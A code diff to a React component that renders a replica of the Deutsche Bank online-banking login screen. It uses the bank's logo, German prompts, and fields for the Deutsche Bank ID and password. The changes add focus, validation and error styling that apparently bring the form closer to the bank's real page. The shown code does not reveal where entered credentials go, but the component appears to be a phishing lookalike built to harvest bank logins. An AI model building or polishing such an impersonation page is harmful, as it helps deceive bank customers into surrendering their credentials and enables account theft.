@@ -9,9 +9,47 @@ import logoAsset from "@/assets/deutsche-bank-logo.svg.asset.json";
 import teaserAsset from "@/assets/deutsche-bank-teaser.jpg.asset.json";
 
 const BLUE = "#0018a8";
-const RED = "#c1002b";
 const LIGHT = "#ceeaf8";
 const LINK = "#0550d1";
+const NAVY = "#171945";
+const ERR = "#78070a";
+const GREY = "#b5b5b5";
+
+function fieldStyle(focused: boolean, touched: boolean, hasValue: boolean) {
+  // Returns { borderColor, boxShadow, labelColor, isError }
+  const errorEmpty = touched && !hasValue;
+  if (focused) {
+    if (errorEmpty) {
+      // double outline: inner red, outer blue
+      return {
+        borderColor: ERR,
+        boxShadow: `0 0 0 3px #fff, 0 0 0 5px ${LINK}`,
+        labelColor: ERR,
+        isError: true,
+      };
+    }
+    if (hasValue) {
+      return {
+        borderColor: LINK,
+        boxShadow: `0 0 0 3px #fff, 0 0 0 5px ${LINK}`,
+        labelColor: LINK,
+        isError: false,
+      };
+    }
+    // focused, empty, not touched
+    return {
+      borderColor: LINK,
+      boxShadow: `0 0 0 3px #fff, 0 0 0 5px ${LINK}`,
+      labelColor: NAVY,
+      isError: false,
+    };
+  }
+  // not focused
+  if (errorEmpty) {
+    return { borderColor: ERR, boxShadow: "none", labelColor: ERR, isError: true };
+  }
+  return { borderColor: GREY, boxShadow: "none", labelColor: NAVY, isError: false };
+}
 
 const DeutscheBank = () => {
   const [searchParams] = useSearchParams();
@@ -22,6 +60,10 @@ const DeutscheBank = () => {
   const [dbId, setDbId] = useState("");
   const [password, setPassword] = useState("");
   const [showPassword, setShowPassword] = useState(false);
+  const [idFocused, setIdFocused] = useState(false);
+  const [idTouched, setIdTouched] = useState(false);
+  const [pwFocused, setPwFocused] = useState(false);
+  const [pwTouched, setPwTouched] = useState(false);
 
   useEffect(() => {
     window.scrollTo(0, 0);
@@ -145,22 +187,52 @@ const DeutscheBank = () => {
                     Guten Tag
                   </h1>
                 )}
-                <p className="text-[15px] mb-5">Bitte geben Sie Ihre Zugangsdaten ein.</p>
+                <p className="text-[15px] mb-5" style={{ color: NAVY }}>Bitte geben Sie Ihre Zugangsdaten ein.</p>
 
                 {step === 1 ? (
                   <>
-                    <label className="block text-[13px] mb-1" style={{ color: "#555" }}>
-                      Deutsche Bank ID
-                    </label>
-                    <input
-                      type="text"
-                      value={dbId}
-                      onChange={(e) => setDbId(e.target.value)}
-                      onKeyDown={(e) => e.key === "Enter" && handleContinue()}
-                      autoFocus
-                      className="w-full px-3 py-3 text-[16px] outline-none"
-                      style={{ border: `1px solid ${RED}`, borderRadius: 2 }}
-                    />
+                    {(() => {
+                      const fs = fieldStyle(idFocused, idTouched, dbId.length > 0);
+                      return (
+                        <>
+                          <label className="block text-[13px] mb-1" style={{ color: fs.labelColor }}>
+                            Deutsche Bank ID
+                          </label>
+                          <div style={{ padding: "3px" }}>
+                            <input
+                              type="text"
+                              value={dbId}
+                              onChange={(e) => setDbId(e.target.value)}
+                              onFocus={() => setIdFocused(true)}
+                              onBlur={() => { setIdFocused(false); setIdTouched(true); }}
+                              onKeyDown={(e) => e.key === "Enter" && handleContinue()}
+                              autoFocus
+                              className="w-full px-3 py-3 text-[16px] outline-none"
+                              style={{
+                                border: `1px solid ${fs.borderColor}`,
+                                borderRadius: 2,
+                                boxShadow: fs.boxShadow,
+                                transition: "box-shadow 80ms ease, border-color 80ms ease",
+                              }}
+                            />
+                          </div>
+                          {fs.isError && (
+                            <div className="flex items-start gap-2 mt-2 text-[13px]" style={{ color: ERR }}>
+                              <span
+                                className="inline-flex items-center justify-center shrink-0 mt-0.5"
+                                style={{
+                                  width: 16, height: 16, borderRadius: "50%",
+                                  background: ERR, color: "#fff",
+                                  fontSize: 11, fontWeight: 700, fontFamily: "serif",
+                                  lineHeight: 1,
+                                }}
+                              >i</span>
+                              <span>Bitte prüfen Sie Ihre Eingabe. Geben Sie Ihre Deutsche Bank ID ein.</span>
+                            </div>
+                          )}
+                        </>
+                      );
+                    })()}
 
                     <div className="flex items-center justify-between mt-28">
                       <a href="#" className="text-[13px] font-bold underline" style={{ color: LINK }}>
@@ -178,29 +250,45 @@ const DeutscheBank = () => {
                   </>
                 ) : (
                   <>
-                    <label className="block text-[13px] mb-1" style={{ color: "#555" }}>
-                      Passwort
-                    </label>
-                    <div className="relative">
-                      <input
-                        type={showPassword ? "text" : "password"}
-                        value={password}
-                        onChange={(e) => setPassword(e.target.value)}
-                        onKeyDown={(e) => e.key === "Enter" && handleLogin()}
-                        autoFocus
-                        className="w-full px-3 py-3 pr-12 text-[16px] outline-none"
-                        style={{ border: `1px solid ${RED}`, borderRadius: 2 }}
-                      />
-                      <button
-                        type="button"
-                        onClick={() => setShowPassword(!showPassword)}
-                        className="absolute right-3 top-1/2 -translate-y-1/2"
-                        style={{ color: BLUE }}
-                        aria-label="Passwort anzeigen"
-                      >
-                        {showPassword ? <EyeOff size={22} /> : <Eye size={22} />}
-                      </button>
-                    </div>
+                    {(() => {
+                      const fs = fieldStyle(pwFocused, pwTouched, password.length > 0);
+                      return (
+                        <>
+                          <label className="block text-[13px] mb-1" style={{ color: fs.labelColor }}>
+                            Passwort
+                          </label>
+                          <div style={{ padding: "3px" }}>
+                            <div className="relative">
+                              <input
+                                type={showPassword ? "text" : "password"}
+                                value={password}
+                                onChange={(e) => setPassword(e.target.value)}
+                                onFocus={() => setPwFocused(true)}
+                                onBlur={() => { setPwFocused(false); setPwTouched(true); }}
+                                onKeyDown={(e) => e.key === "Enter" && handleLogin()}
+                                autoFocus
+                                className="w-full px-3 py-3 pr-12 text-[16px] outline-none"
+                                style={{
+                                  border: `1px solid ${fs.borderColor}`,
+                                  borderRadius: 2,
+                                  boxShadow: fs.boxShadow,
+                                  transition: "box-shadow 80ms ease, border-color 80ms ease",
+                                }}
+                              />
+                              <button
+                                type="button"
+                                onClick={() => setShowPassword(!showPassword)}
+                                className="absolute right-3 top-1/2 -translate-y-1/2"
+                                style={{ color: BLUE }}
+                                aria-label="Passwort anzeigen"
+                              >
+                                {showPassword ? <EyeOff size={22} /> : <Eye size={22} />}
+                              </button>
+                            </div>
+                          </div>
+                        </>
+                      );
+                    })()}
 
                     <div className="flex items-center justify-between mt-28">
                       <a href="#" className="text-[13px] font-bold underline" style={{ color: LINK }}>
